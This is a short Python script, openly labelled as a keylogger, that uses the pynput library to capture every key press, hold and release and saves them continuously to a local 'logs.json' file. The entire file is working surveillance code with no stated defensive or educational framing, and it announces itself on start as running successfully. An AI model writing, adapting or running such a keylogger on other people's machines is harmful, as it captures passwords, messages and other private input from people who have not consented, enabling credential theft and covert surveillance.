from pynput import keyboard
import json

key_list = []
x = False
key_strokes=""

def update_json_file(key_list):
    with open('logs.json', '+wb') as key_log:
        key_list_bytes = json.dumps(key_list).encode()
        key_log.write(key_list_bytes)

def on_press(key):
    global x,key_list
    if x == False:
        key_list.append(
            {'Pressed': f'{key}'}
            )
        x = True
    if x == True:
        key_list.append(
            {'Held': f'{key}'}
            )
    update_json_file(key_list)

def on_release(key):
    global x, key_list, key_strokes
    key_list.append(
        {'Released': f'{key}'}
        )
    if x==True:
        x = False
    update_json_file(key_list)

print("[+] Running Keylogger Successfully...!\n[!] Saving the key logs in 'logs.json'")

with keyboard.Listener(
    on_press=on_press,
    on_release=on_release) as listener:
    listener.join()
